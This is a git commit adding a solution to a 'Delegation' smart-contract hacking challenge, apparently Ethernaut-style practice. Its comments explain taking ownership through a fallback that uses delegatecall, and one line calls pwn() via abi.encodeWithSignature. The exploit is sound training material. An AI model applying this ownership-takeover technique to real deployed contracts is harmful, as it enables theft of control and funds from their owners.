561ecd30adf06977fbe02947b98a4e3840fa2310
Rahat <rahat@rahatcodes.com>
2022-07-01 17:44:04 -0400

    ayyy took ownership of delegation

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -8,8 +8,20 @@ contract AttackingDelegation {
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
+    //need to execute pwn so that it changes the owner
+    //fallback on delegation calls the delegate contract which has pwn
+    //call method can access the fallback
+    //delegate call in fallback will help us execute pwn and make it as if
+    //our address is the one calling the function from the delegate contract
+
+
+    //solution:
+    //The functions abi.encodeWithSignature(...) and abi.encodeWithSelector(...) 
+    //can be used in Solidity to prepare payloads in raw bytes for external contract calls. 
+    //Such payloads can then be passed as parameters to the low level Solidity .call(...) , 
+    //.delegatecall(...) and .staticcall(...) functions.
 
     function hackContract() external {
-        // Code me!
+        contractAddress.call(abi.encodeWithSignature("pwn()"));
     }
 }
